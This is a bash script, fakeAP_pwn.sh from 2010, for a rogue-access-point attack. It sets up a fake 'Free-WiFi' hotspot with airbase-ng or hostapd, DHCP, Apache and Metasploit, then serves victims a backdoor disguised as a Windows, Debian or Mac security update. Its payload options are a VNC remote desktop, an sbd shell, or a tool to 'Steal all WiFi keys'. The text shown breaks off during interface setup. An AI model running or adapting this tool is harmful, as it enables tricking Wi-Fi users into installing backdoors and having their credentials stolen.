#!/bin/bash                                                                                    #
# (C)opyright 2010 - g0tmi1k & joker5bb                                                        #
# fakeAP_pwn.sh v0.3 (Beta-#61 2010-07-28)                                                     #
#---Important----------------------------------------------------------------------------------#
# Make sure to copy "www": cp -rf www/* /var/www/fakeAP_pwn                                    #
# The VNC password is "g0tmi1k" (without "")                                                   #
#---ToDo---------------------------------------------------------------------------------------#
# v0.4 - Multiple clients - Each time a new client connects they will be redirected to our     #
#                           crafted page without affecting any other clients who are browsing  #
#                           Create a captive portal with:                                      #
#                               -CoovaChilli                                                   #
#                               -FreeRadius                                                    #
#                               -MySQL                                                         #
# v0.4 - Firewall Rules   - Don't expose local machines from the internet interface            #
# v0.5 - Java exploit     - Different "delivery system" ;)                                     #
# v0.6 - Linux/OSX/x64    - Make compatible                                                    #
# v0.7 - Clone AP         - Copies SSID & BSSID then kick all connected clients...             #
# v0.8 - S.E.T.           - Social Engineering Toolkit                                         #
#---Ideas--------------------------------------------------------------------------------------#
# Monitor traffic         - That isn't on port 80 before they download the payload             #
#---Dump Pad-----------------------------------------------------------------------------------#
# use vnc.rb                                                                                   #
# not sure if MTU is working                                                                   #
# Merge; debug, diagnostics (also improve), verbose.                                           #
#set +o verbose, set -x                                                                        #
# Beep on Client Connected                                                                     #
# Check for other monitor inferfaces?                                                          #
# check for update at start?                                                                   #
#---Defaults-----------------------------------------------------------------------------------#
# The interfaces you use (Check with ifconfig!)
interface=eth0
wifiInterface=wlan0
monitorInterface=mon0

# WiFi Name & Channel to use
ESSID="Free-WiFi"
fakeAPchannel=1

# [airbase-ng/hostapd] What software to use for the FakeAP
apType=airbase-ng

# [normal/transparent/non] - Normal = Doesn't force them, just sniff. Transparent = after been infected gives them internet. non = No internet access afterwards
apMode=transparent

# [sbd/vnc/wkv/other] What to upload to the user. vnc=remote desktop, sbd=cmd line, wkv=Steal all WiFi keys
payload=wkv
backdoorPath=/root/backdoor.exe

# The directory location to the crafted web page.
www=/var/www/fakeAP_pwn

# If your having "timing out" problems, change this.
mtu=1500

# [true/false] Respond to every WiFi probe request? true = yes, false = no
respond2All=false

# [random/set/false] Change the FakeAP MAC Address?
fakeAPmac=set
macAddress=00:05:7c:9a:58:3f

 # [true/false] Runs extra programs after session is created
extras=false

#If you're having problems, creates a output file or displays exactly whats going on. 0=nothing, 1 = info, 2 = inf + commands
debug=false
diagnostics=false
verbose=0

#---Variables----------------------------------------------------------------------------------#
gatewayIP=$(route -n | awk '/^0.0.0.0/ {getline; print $2}')
    ourIP=$(ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}')
     port=$(shuf -i 2000-65000 -n 1)
  version="0.3 (Beta-#61)"
      www="${www%/}"
trap 'cleanup interrupt' 2 # Interrupt - "Ctrl + C"

#----Functions---------------------------------------------------------------------------------#
function cleanup() {
   if [ "$1" == "user" ] ; then exit 3 ; fi
   echo
   echo -e "\e[01;32m[>]\e[00m Cleaning up..."
   if [ "$diagnostics" == "true" ] ; then echo "-Cleaning up-----------------------------" >> fakeAP_pwn.output; fi
   if [ "$1" != "clean" ] ; then $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Monitor Mode (Stopping)" -e "killall xterm" ; fi
   if [ "$debug" != "true" ] && [ "$diagnostics" != "true" ] ; then
      if [ -e /tmp/fakeAP_pwn.rb ] ;          then rm /tmp/fakeAP_pwn.rb; fi
      if [ -e /tmp/fakeAP_pwn.dhcp ] ; then rm /tmp/fakeAP_pwn.dhcp; fi
      #if [ -e /tmp/fakeAP_pwn.dns ] ;        then rm /tmp/fakeAP_pwn.dns; fi
      if [ -e /tmp/fakeAP_pwn.wkv ] ;         then rm /tmp/fakeAP_pwn.wkv; fi
      if [ -e /tmp/fakeAP_pwn.lock ] ;        then rm /tmp/fakeAP_pwn.lock; fi
      if [ -e /tmp/fakeAP_pwn.hostapd ] ;     then rm /tmp/fakeAP_pwn.hostapd; fi
      if [ -e /tmp/fakeAP_pwn.dsniff ] ;      then rm /tmp/fakeAP_pwn.dsniff; fi
      if [ -e /tmp/fakeAP_pwn.ssl ] ;         then rm /tmp/fakeAP_pwn.ssl; fi
      if [ -e /tmp/hostapd.dump ] ;           then rm /tmp/hostapd.dump; fi
      if [ -e /etc/apache2/sites-available/fakeAP_pwn ]; then # We may want to give apahce running when in "non" mode. - to show a different page!
         command="ls /etc/apache2/sites-available/ | xargs a2dissite fakeAP_pwn && a2ensite default* && a2dismod ssl && /etc/init.d/apache2 stop"
         if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
         $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Restoring apache" -e "$command"
         rm /etc/apache2/sites-available/fakeAP_pwn
      fi
      if [ -e $www/kernal_1.83.90-5+lenny2_i386.deb ] ; then rm $www/kernal_1.83.90-5+lenny2_i386.deb; fi
      if [ -e $www/SecurityUpdate1-83-90-5.dmg.bin ] ;  then rm $www/SecurityUpdate1-83-90-5.dmg.bin; fi
      if [ -e $www/Windows-KB183905-x86-ENU.exe ] ;     then rm $www/Windows-KB183905-x86-ENU.exe; fi
   fi
   if [ "$1" != "clean" ] ; then
      if [ "$apType" == "airbase-ng" ] ; then
         command=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
         if [ "$command" == "$monitorInterface" ] ; then
            sleep 3 # Some times it needs to catch up/wait
            command="airmon-ng stop $monitorInterface"
            if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
            $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Monitor Mode (Stopping)" -e "$command"
         fi
      fi
   fi
   if [ "$apMode" == "non" ] ; then # Else will will remove their internet access!
      if [ `echo route | egrep "10.0.0.0"` ] ; then route del -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1; fi
      iptables --flush        # remove existing rules
      iptables --delete-chain
      iptables --zero
      echo 0 > /proc/sys/net/ipv4/ip_forward
   fi
   # ubuntu fixes
   command="service network-manager start"
   if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
   $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Starting 'network-manager'" -e "$command" # Start network-manager
   if [ -e /etc/apparmor.d/usr.sbin.dhcpd3.bkup ]; then mv -f /etc/apparmor.d/usr.sbin.dhcpd3.bkup /etc/apparmor.d/usr.sbin.dhcpd3; fi # Fixes folder persmissions

   echo -e "\e[01;36m[>]\e[00m Done! (= Have you... g0tmi1k?"
   exit 0
}
function help() {
   echo "(C)opyright 2010 g0tmi1k & joker5bb ~ http://g0tmi1k.blogspot.com

 Usage: bash fakeAP_pwn.sh -i [interface] -w [interface] -m [interface] -e [essid] -c [channel]
              -y [airbase-ng/hostapd] -o [normal/transparent/non] -p [sbd/vnc/other] -b [/path]
              -h [/path] -t [MTU] -r (-z / -a [mac address]) -e -d -v -V [-u] [-?]

 Common options:
   -i  ---  Internet Interface (which inferface to use - check with ifconfig)  e.g. eth0
   -w  ---  WiFi Interface (which inferface to use - check with ifconfig)  e.g. wlan0
   -m  ---  Monitor Interface (which inferface to use - check with ifconfig)  e.g. mon0

   -e  ---  WiFi Name e.g. Free-WiFi
   -c  ---  Set the channel for the FakeAP to run on e.g. 6

[*]-y  ---  airbase-ng/hostapd. What software to use for the FakeAP

   -o  ---  Ap Mode. normal/transparent/nontransparent e.g. transparent

   -p  ---  Payload (sbd/vnc/wkv/other) e.g. vnc
   -b  ---  Backdoor Path (only used when payload is set to other) e.g. /path/to/backdoor.exe

   -h  ---  htdocs path e.g. /var/www/fakeAP_pwn
   -t  ---  Maximum Transmission Unit - If your having timing out problems, change this. e.g. 1500
   -r  ---  Respond to every probe request

   -z  ---  Randomizes the MAC Address of the FakeAP
   -a  ---  Use this MAC Address. e.g. 00:05:7c:9a:58:3f

[*]-x  ---  Does a few \"extra\" things after target is infected.
   -d  ---  Debug Mode (Doesn't close any pop up windows)
   -v  ---  Verbose mode (Displays infomation)
   -V  ---  (Higher) Verbose mode (Displays infomation + commands)

   -u  ---  Update fakeAP_pwn

   -?  ---  This screen

 Known issues:
   -\"Odd\" SSID
        > Airbase-ng has a few bugs... Re-run the script.
        > Try hostap
   -Can't connect
        > Airbase-ng has a few bugs... Re-run the script. (Try with -v this time)
        > Try hostap
   -No IP
        > Use latest version of dhcp3-server
   -Slow
        > Don't use a virtual machines
        > Your hardware - 802.11n doesn't work too well!
        > Try hostap
        > Try a different MTU value.
"
   exit 1
}
function update() {
   #svn checkout http://fakeap-pwn.googlecode.com/svn/
   #svn update
   #wget http://fakeap-pwn.googlecode.com/ fakeAP_pwn.tar.gz
   if [ -e /usr/bin/svn ] ; then
      echo -e "\e[01;33m[>]\e[00m Checking for update..."
      update=$(svn info http://fakeap-pwn.googlecode.com/svn/ | grep "Revision:" |cut -c11-)
      if [ "$version" != "0.3 (Beta-#$update)" ] ; then
         echo -e "\e[01;33m[i]\e[00m Updating..."
         svn export -q --force http://fakeap-pwn.googlecode.com/svn/trunk/fakeAP_pwn.sh fakeAP_pwn.sh
         echo -ne "\e[01;36m[>]\e[00m Updated to $update. (="
      else
         echo -e "\e[01;33m[i]\e[00m You're using the latest version. (="
      fi
   else
         echo -e "\e[01;33m[i]\e[00m Updating..."
         wget -nv -N http://fakeap-pwn.googlecode.com/svn/trunk/fakeAP_pwn.sh
         echo -e "\e[01;33m[i]\e[00m Updated! (="
   fi
   echo
   exit 2
}

function testAP() {
   if [ "$1" == "" ] ||  [ "$2" == "" ] ; then return 1; fi # Coding error
   eval list=( $(iwlist $2 scan 2>/dev/null | awk -F":" '/ESSID/{print $2}') )
   if [ -z "${list[0]}" ]; then
      return 2 # Couldn't detect a single AP
   fi
   for item in "${list[@]}" ; do
      if [ "$item" == "$1" ]; then return 0; fi # Found it!
   done
   return 3 # Couldn't find the fake AP
}

#----------------------------------------------------------------------------------------------#
echo -e "\e[01;36m[*]\e[00m fakeAP_pwn v$version"

while getopts "i:w:m:e:c:y:o:p:b:h:t:rz:a:xdDvVu?" OPTIONS; do
  case ${OPTIONS} in
    i     ) export interface=$OPTARG;;
    w     ) export wifiInterface=$OPTARG;;
    m     ) export monitorInterface=$OPTARG;;
    e     ) export ESSID=$OPTARG;;
    c     ) export fakeAPchannel=$OPTARG;;
    y     ) export apType=$OPTARG;;
    o     ) export apMode=$OPTARG;;
    p     ) export payload=$OPTARG;;
    b     ) export backdoorPath=$OPTARG;;
    h     ) export www=$OPTARG;;
    t     ) export mtu=$OPTARG;;
    r     ) export respond2All="true";;
    z     ) export fakeAPmac=$OPTARG;;
    a     ) export macAddress=$OPTARG;;
    x     ) export extras="true";;
    d     ) export debug="true";;
    D     ) export diagnostics="true";;
    v     ) export verbose="1";;
    V     ) export verbose="2";;
    u     ) update;;
    ?     ) help;;
    *     ) echo -e "\e[00;31m[-]\e[00m Unknown option.";;   # DEFAULT
  esac
done
#----------------------------------------------------------------------------------------------#
echo -e "\e[01;32m[>]\e[00m Checking environment..."

if [ "$(id -u)" != "0" ] ; then echo -e "\e[00;31m[-]\e[00m Not a superuser." 1>&2; cleanup user; fi

export xterm="xterm"
if [ "$debug" == "true" ] ; then
   echo -e "\e[01;33m[i]\e[00m Debug Mode\e[00m"
   export xterm="xterm -hold"
elif [ "$diagnostics" == "true" ] ; then
   echo -e "\e[01;34m[i]\e[00m Diagnostics Mode\e[00m"
fi


if [ "$wifiInterface" == "" ] ; then echo -e "\e[00;31m[-]\e[00m wifiInterface can't be blank" 1>&2; cleanup; fi
command=$(iwconfig $wifiInterface 2>/dev/null | grep "802.11" | cut -d" " -f1)
if [ ! $command ]; then
   echo -e "\e[01;33m[i]\e[00m $wifiInterface isn't a wireless interface."
   echo -e "\e[01;33m[i]\e[00m Searching for a wireless interface"
   command=$(iwconfig 2>/dev/null | grep "802.11" | cut -d" " -f1)
   if [ $command ] ; then
      wifiInterface=$command
      echo -e "\e[01;33m[i]\e[00m Found $wifiInterface"
   else
      echo -e "\e[00;31m[-]\e[00m Couldn't find a wireless interface." 1>&2
      cleanup
   fi
fi

if [ "$apMode" != "non" ] ; then
   if [ "$interface" == "" ] ; then echo -e "\e[00;31m[-]\e[00m interface can't be blank" 1>&2; cleanup; fi
   if [ "$interface" == "$wifiInterface" ] ; then echo -e "\e[00;31m[-]\e[00m interface and wifiInterface can't be the same!" 1>&2; cleanup; fi
   if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then echo -e "\e[01;34m[i]\e[00m Testing internet connection"; fi
   command=$( ping -I $interface -c 1 google.com > /dev/null)
   if ! $command > /dev/null 2>&1; then
      echo -e "\e[00;31m[-]\e[00m Couldn't find a internet connection."
      echo -e "\e[01;33m[i]\e[00m Switching apMode to: Non"
      apMode="non"
   fi
fi

if [ "$apType" == "airbase-ng" ] ; then
   apInterface=at0
else
   apInterface=$wifiInterface
fi

if [ -e /tmp/fakeAP_pwn.wkv ] ; then rm /tmp/fakeAP_pwn.wkv; fi
if [ -e fakeAP_pwn.output ] ;   then rm fakeAP_pwn.output; fi

if [ "$debug" == "true" ] || [ "$verbose" != "0" ] ; then
    echo -e "\e[01;33m[i]\e[00m        interface=$interface
\e[01;33m[i]\e[00m    wifiInterface=$wifiInterface
\e[01;33m[i]\e[00m monitorInterface=$monitorInterface
\e[01;33m[i]\e[00m      apInterface=$apInterface
\e[01;33m[i]\e[00m            ESSID=$ESSID
\e[01;33m[i]\e[00m    fakeAPchannel=$fakeAPchannel
\e[01;33m[i]\e[00m           apType=$apType
\e[01;33m[i]\e[00m           apMode=$apMode
\e[01;33m[i]\e[00m          payload=$payload
\e[01;33m[i]\e[00m     backdoorPath=$backdoorPath
\e[01;33m[i]\e[00m              www=$www
\e[01;33m[i]\e[00m              mtu=$mtu
\e[01;33m[i]\e[00m      respond2All=$respond2All
\e[01;33m[i]\e[00m        fakeAPmac=$fakeAPmac
\e[01;33m[i]\e[00m       macAddress=$macAddress
\e[01;33m[i]\e[00m           extras=$extras
\e[01;33m[i]\e[00m            debug=$debug
\e[01;33m[i]\e[00m      diagnostics=$diagnostics
\e[01;33m[i]\e[00m          verbose=$verbose
\e[01;33m[i]\e[00m        gatewayIP=$gatewayIP
\e[01;33m[i]\e[00m            ourIP=$ourIP
\e[01;33m[i]\e[00m             port=$port"
fi

if [ "$diagnostics" == "true" ] ; then
    echo "fakeAP_pwn v$version
$(date)
-Variables-------------------------------
        interface=$interface
    wifiInterface=$wifiInterface
 monitorInterface=$monitorInterface
      apInterface=$apInterface
            ESSID=$ESSID
    fakeAPchannel=$fakeAPchannel
           apType=$apType
           apMode=$apMode
          payload=$payload
     backdoorPath=$backdoorPath
              www=$www
              mtu=$mtu
      respond2All=$respond2All
        fakeAPmac=$fakeAPmac
       macAddress=$macAddress
           extras=$extras
            debug=$debug
      diagnostics=$diagnostics
          verbose=$verbose
        gatewayIP=$gatewayIP
            ourIP=$ourIP
             port=$port
-Environment-----------------------------" >> fakeAP_pwn.output
    echo "-Kernal----------------------------------" >> fakeAP_pwn.output
    echo -e "\e[01;34m[i]\e[00m Finding kernal version"
    uname -a >> fakeAP_pwn.output
    echo "-Hardware--------------------------------" >> fakeAP_pwn.output
    echo -e "\e[01;34m[i]\e[00m Finding hardware infomation"
    lspci -knn >> fakeAP_pwn.output
    echo "-Network---------------------------------" >> fakeAP_pwn.output
    echo -e "\e[01;34m[i]\e[00m Finding network infomation"
    ifconfig >> fakeAP_pwn.output
    echo "-----------------------------------------" >> fakeAP_pwn.output
    ifconfig -a >> fakeAP_pwn.output
    if [ "$apMode" != "non" ] ; then
        echo "-Ping------------------------------------" >> fakeAP_pwn.output
        echo -e "\e[01;34m[i]\e[00m ping -I $interface -c 4 $ourIP"
        ping -I $interface -c 4 $ourIP >> fakeAP_pwn.output
        echo "-----------------------------------------" >> fakeAP_pwn.output
        echo -e "\e[01;34m[i]\e[00m ping -I $interface -c 4 $gatewayIP"
        ping -I $interface -c 4 $gatewayIP >> fakeAP_pwn.output
        echo "-----------------------------------------" >> fakeAP_pwn.output
        echo -e "\e[01;34m[i]\e[00m ping -I $interface -c 4 google.com"
        command=$(ping -I $interface -c 4 google.com >> fakeAP_pwn.output)
        if eval $command; then
           echo "-->Active Internet connection" >> fakeAP_pwn.output
        else
           echo "-->No internet available" >> fakeAP_pwn.output
        fi
    fi
    echo "*Commands********************************" >> fakeAP_pwn.output
fi

if [ "$ESSID" == "" ] ; then echo -e "\e[00;31m[-]\e[00m ESSID can't be blank" 1>&2; cleanup; fi
if [ "$fakeAPchannel" == "" ] ; then echo -e "\e[00;31m[-]\e[00m fakeAPchannel can't be blank" 1>&2; cleanup; fi
if [ "$apType" == "airbase-ng" ] && [ "$monitorInterface" == "" ] ; then echo -e "\e[00;31m[-]\e[00m monitorInterface isn't correct" 1>&2; cleanup; fi
if [ "$apType" == "" ] && [ "$apType" != "airbase-ng" ] && [ "$apType" != "hostapd" ] ; then echo -e "\e[00;31m[-]\e[00m apType isn't correct" 1>&2; cleanup; fi
if [ "$payload" == "" ] && [ "$payload" != "sbd" ] && [ "$payload" != "vnc" ] && [ "$payload" != "wkv" ] && [ "$payload" != "other" ] ; then echo -e "\e[00;31m[-]\e[00m payload isn't correct" 1>&2; cleanup; fi
if [ "$apMode" == "" ] && [ "$apMode" != "normal" ] && [ "$apMode" != "transparent" ] && [ "$apMode" != "non" ] ; then echo -e "\e[00;31m[-]\e[00m apMode isn't correct" 1>&2; cleanup; fi
if [ "$respond2All" == "" ] && [ "$respond2All" != "true" ] && [ "$respond2All" != "false" ] ; then echo -e "\e[00;31m[-]\e[00m respond2All isn't correct" 1>&2; cleanup; fi
if [ "$fakeAPmac" == "" ] && [ "$fakeAPmac" != "random" ] && [ "$fakeAPmac" != "set" ] && [ "$fakeAPmac" != "false" ] ; then echo -e "\e[00;31m[-]\e[00m fakeAPmac isn't correct" 1>&2; cleanup; fi
if [ "$macAddress" == "" ] && ! [ `echo $macAddress | egrep "^([0-9a-fA-F]{2}\:){5}[0-9a-fA-F]{2}$"` ] ; then echo -e "\e[00;31m[-]\e[00m macAddress isn't correct" 1>&2; cleanup; fi
if [ "$extras" == "" ] &&  [ "$extras" != "true" ] && [ "$extras" != "false" ] ; then echo -e "\e[00;31m[-]\e[00m extras isn't correct" 1>&2; cleanup; fi
if [ "$debug" == "" ] && [ "$debug" != "true" ] && [ "$debug" != "false" ] ; then echo -e "\e[00;31m[-]\e[00m debug isn't correct" 1>&2; cleanup; fi
if [ "$diagnostics" == "" ] && [ "$diagnostics" != "true" ] && [ "$diagnostics" != "false" ] ; then echo -e "\e[00;31m[-]\e[00m debug isn't correct" 1>&2; cleanup; fi
if [ "$verbose" == "" ] && [ "$verbose" != "0" ] && [ "$verbose" != "1" ] && [ "$verbose" != "2" ] ; then echo -e "\e[00;31m[-]\e[00m verbose isn't correct" 1>&2; cleanup; fi

if [ ! -e "$www/index.php" ] ; then
   if [ -d "$www/" ] ; then
      mkdir -p $www
      command="cp -rf www/* $www/"
      if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
      $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Copying www/" -e "$command"
   fi
   if [ ! -e "$www/index.php" ] ; then
      echo -e "\e[00;31m[-]\e[00m Missing index.php. Did you run: cp -rf www/* $www/" 1>&2
      cleanup
   fi
fi

#Add a repo that has it all?
if [ "$apType" == "airbase-ng" ] ; then
   if [ ! -e /usr/sbin/airmon-ng ] && [ ! -e /usr/local/sbin/airmon-ng ] ; then
      echo -e "\e[00;31m[-]\e[00m aircrack-ng isn't installed."
      read -p "[*] Would you like to try and install it? [Y/N]: " -n 1
      if [[ $REPLY =~ ^[Yy]$ ]] ; then
         command=$(apt-get -y install aircrack-ng)
      fi
      if [ ! -e /usr/sbin/airmon-ng ] && [ ! -e /usr/local/sbin/airmon-ng ] ; then
         echo -e "\e[00;31m[-]\e[00m Failed to install aircrack-ng" 1>&2;
         cleanup;
      else
         echo -e "\e[01;33m[i]\e[00m Install aircrack-ng"
      fi
   fi
elif [ "$apType" == "hostapd" ] ; then
   if [ ! -e /usr/sbin/hostapd ] ; then
      echo -e "\e[00;31m[-]\e[00m hostapd isn't installed."
      read -p "[*] Would you like to try and install it? [Y/N]: " -n 1
      if [[ $REPLY =~ ^[Yy]$ ]] ; then
         command=$(apt-get -y install hostapd)
#         command=$(wget http://people.suug.ch/~tgr/libnl/files/libnl-1.1.tar.gz)
#         command=$(tar zxvf libnl-1.1.tar.gz && rm libnl-1.1.tar.gz)
#         command=$(libnl-1.1/configure)
      fi
      if [ ! -e /usr/sbin/hostapd ] ; then
      echo -e "\e[00;31m[-]\e[00m Failed to install hostapd." 1>&2;
      cleanup;
      else
         echo -e "\e[01;33m[i]\e[00m Install hostapd."
      fi
   fi
fi
if [ ! -e /usr/bin/macchanger ] ; then
   echo -e "\e[00;31m[-]\e[00m macchanger isn't installed."
   read -p "[*] Would you like to try and install it? [Y/N]: " -n 1
   if [[ $REPLY =~ ^[Yy]$ ]] ; then
      command=$(apt-get -y install macchanger)
   fi
   if [ ! -e /usr/bin/macchanger ] ; then
      echo -e "\e[00;31m[-]\e[00m Failed to install macchanger" 1>&2;
      cleanup;
   else
      echo -e "\e[01;33m[i]\e[00m Install macchanger"
   fi
fi
if [ ! -e /usr/sbin/dhcpd3 ] ; then
   echo -e "\e[00;31m[-]\e[00m dhcpd3 isn't installed."
   read -p "[*] Would you like to try and install it? [Y/N]: " -n 1
   if [[ $REPLY =~ ^[Yy]$ ]] ; then
      command=$(apt-get -y install dhcp3-server)
   fi
   if [ -e /usr/sbin/dhcpd3 ] ; then
      echo -e "\e[00;31m[-]\e[00m Failed to install dhcpd3" 1>&2;
      cleanup;
   else
      echo -e "\e[01;33m[i]\e[00m Install dhcpd3"
   fi
fi
if [ ! -e /usr/sbin/apache2 ] ; then
   echo -e "\e[00;31m[-]\e[00m apache2 isn't installed."
   read -p "[*] Would you like to try and install it? [Y/N]: " -n 1
   if [[ $REPLY =~ ^[Yy]$ ]] ; then
      command=$(apt-get -y install apache2 php5)
   fi
   if [ ! -e /usr/sbin/apache2 ] ; then
      echo -e "\e[00;31m[-]\e[00m Failed to install apache2" 1>&2;
      cleanup;
   else
      echo -e "\e[01;33m[i]\e[00m Install apache2 & php5"
   fi
fi
if [ "$payload" == "sbd" ] ; then
   if [ ! -e /usr/local/bin/sbd ] ; then
      echo -e "\e[00;31m[-]\e[00m sbd isn't installed."
      read -p "[*] Would you like to try and install it? [Y/N]: " -n 1
      if [[ $REPLY =~ ^[Yy]$ ]] ; then
         command=$(apt-get -y install sbd)
      fi
      if [ ! -e /usr/local/bin/sbd ] ; then
         echo -e "\e[00;31m[-]\e[00m Failed to install sbd" 1>&2;
         cleanup;
      else
         echo -e "\e[01;33m[i]\e[00m Install sbd"
      fi
   fi
elif [ "$payload" == "vnc" ] ; then
   if [ ! -e /usr/bin/vncviewer ] ; then
      echo -e "\e[00;31m[-]\e[00m vnc isn't installed."
      read -p "[*] Would you like to try and install it? [Y/N]: " -n 1
      if [[ $REPLY =~ ^[Yy]$ ]] ; then
         command=$(apt-get -y install vnc)
      fi
      if [ ! -e /usr/bin/vncviewer ] ; then
         echo -e "\e[00;31m[-]\e[00m Failed to install vnc" 1>&2;
         cleanup;
      else
         echo -e "\e[01;33m[i]\e[00m Install vnc"
      fi
   fi
elif [ "$payload" == "wkv" ] ; then
   if ! [ -e "$www/wkv-x64.exe" ] ; then echo -e "\e[00;31m[-]\e[00m There isn't a wkv-x64.exe at $www/wkv-x64.exe." 1>&2; cleanup; fi
else
   if ! [ -e "$backdoorPath" ] ; then echo -e "\e[00;31m[-]\e[00m There isn't a backdoor at $backdoorPath." 1>&2; cleanup; fi
fi
if [ ! -e /opt/metasploit3/bin/msfconsole ] ; then
   echo -e "\e[00;31m[-]\e[00m Metasploit isn't installed."
   read -p "[*] Would you like to try and install it? [Y/N]: " -n 1
   if [[ $REPLY =~ ^[Yy]$ ]] ; then
      command=$(apt-get -y install framework3)
   fi
   if [ ! -e /opt/metasploit3/bin/msfconsole ] ; then
      command=$(apt-get -y install metasploit)
   fi
   if [ ! -e /opt/metasploit3/bin/msfconsole ] ; then
      echo -e "\e[00;31m[-]\e[00m Failed to install metasploit" 1>&2;
      cleanup;
   else
      echo -e "\e[01;33m[i]\e[00m Install metasploit"
   fi
fi
if [ "$extras" == "true" ] ; then
   if [ ! -e /usr/bin/imsniff ] ; then
      echo -e "\e[00;31m[-]\e[00m imsniff isn't installed."
      read -p "[*] Would you like to try and install it? [Y/N]: " -n 1
      if [[ $REPLY =~ ^[Yy]$ ]] ; then
         command=$(apt-get -y install imsniff)
      fi
      if [ ! -e /usr/bin/imsniff ] ; then
         echo -e "\e[00;31m[-]\e[00m Failed to install imsniff" 1>&2;
         cleanup;
      else
         echo -e "\e[01;33m[i]\e[00m Install imsniff"
      fi
   fi
fi

if [ "$apMode" != "non" ] ; then
   command="ifconfig $interface up && sleep 1" #command="ifconfig $interface down && sleep 1 && ifconfig $interface up && sleep 1" fails if you dont have DHCP
#if [ ! $(ifconfig | grep -o -q "$interface") == "" ] ; then echo "Stil down" cleanup; fi # check to make sure $interface came up!
   if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
   $xterm -geometry 75x15+100+0 -T "fakeAP_pwn v$version - Resetting interface" -e "$command"
   command=$(ifconfig | grep $interface | awk '{print $1}')
   if [ "$command" != "$interface" ] ; then
      echo -e "\e[00;31m[-]\e[00m The gateway interface $interface, isn't correct." 1>&2
      if [ "$debug" == "true" ] ; then ifconfig; fi
      cleanup
   fi
   if [ -z "$ourIP" ] ; then
      command="dhclient $interface"
      if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
      $xterm -geometry 75x15+100+0 -T "fakeAP_pwn v$version - Acquiring an IP Address" -e "$command"
      sleep 3
      ourIP=$(ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}')
      if [ -z "$ourIP" ] ; then
         echo -e "\e[00;31m[-]\e[00m IP Problem. Haven't got a IP address on $interface. Try running the script again, once you have!"  1>&2
         command=$(ps aux | grep $interface | awk '!/grep/ && !/awk/ && !/fakeAP_pwn/ {print $2}' | while read line; do echo -n "$line "; done | awk '{print}')
         if [ -n "$command" ] ; then
            kill $command # Kill dhclient on the internet interface after it fails to get ip, to prevent errors in restarting the script
         fi
         cleanup
      fi
      gatewayIP=$(route -n | awk '/^0.0.0.0/ {getline; print $2}')
      command=$(route -n | awk '/^0.0.0.0/ {getline; print $2}')
      if [ "$command" == "" ] ; then
         echo -e "\e[00;31m[-]\e[00m Gateway IP Problem. Can't detect the gateway on $interface."  1>&2
         cleanup
      fi
   fi
else
   gatewayIP=10.0.0.1 # For DHCP
   #ourIP=10.0.0.1 # Not sure if this is right/correct/needed
fi

command=$(ifconfig -a | grep $wifiInterface | awk '{print $1}')
if [ "$command" != "$wifiInterface" ] ; then
   echo -e "\e[00;31m[-]\e[00m The wireless interface $wifiInterface, isn't correct." 1>&2
   if [ "$debug" == "true" ] ; then iwconfig; fi
   cleanup
fi

#----------------------------------------------------------------------------------------------#
if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] ; then echo -e "\e[01;32m[>]\e[00m Stopping services and programs..." ; fi
command="killall dhcpd3 apache2 wicd-client airbase-ng hostapd"
if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Killing 'Programs'"        -e "$command" # Killing "wicd-client" to prevent channel hopping
command="/etc/init.d/dhcp3-server stop"
if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Killing 'DHCP3 Service'"   -e "$command" # Stop DHCP
command="/etc/init.d/apache2 stop"
if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Killing 'Apache2 Service'" -e "$command" # Stop Web Server
command="/etc/init.d/wicd stop"
if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Killing 'wicd Service'"    -e "$command" # Stopping wicd to prevent channel hopping
command="service network-manager stop"
if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Killing 'network-manager'" -e "$command" # Stop network-manager (Ubuntu)

#----------------------------------------------------------------------------------------------#
echo -e "\e[01;32m[>]\e[00m Setting up wireless card..."
if [ "$apType" == "airbase-ng" ] ; then
   command=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
   if [ "$command" == "$monitorInterface" ] ; then
      command="airmon-ng stop $monitorInterface"
